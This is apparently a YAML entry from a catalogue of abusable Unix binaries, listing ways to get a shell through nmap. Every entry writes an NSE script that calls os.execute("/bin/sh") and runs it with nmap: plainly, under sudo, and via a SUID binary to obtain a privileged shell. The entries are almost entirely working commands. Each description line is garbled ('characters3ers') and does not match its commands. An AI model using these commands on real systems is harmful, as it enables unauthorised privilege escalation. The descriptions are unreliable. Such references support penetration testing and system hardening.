---
functions:
  execute-non-interactive:
    - description: Echoing of input characters3ers is disabled.
      code: |
        echo 'os.execute("/bin/sh")' > /tmp/script.nse
        nmap --script=/tmp/script.nse
  sudo-enabled:
    - description: Echoing of input characters3ers is disabled.
      code: |
        echo 'os.execute("/bin/sh")' > /tmp/script.nse
        sudo nmap --script=/tmp/script.nse
  suid-enabled:
    - description: Echoing of input characters3ers is disabled.
      code: |
        echo 'os.execute("/bin/sh -p")' > /tmp/script.nse
        ./nmap --script=/tmp/script.nse
---
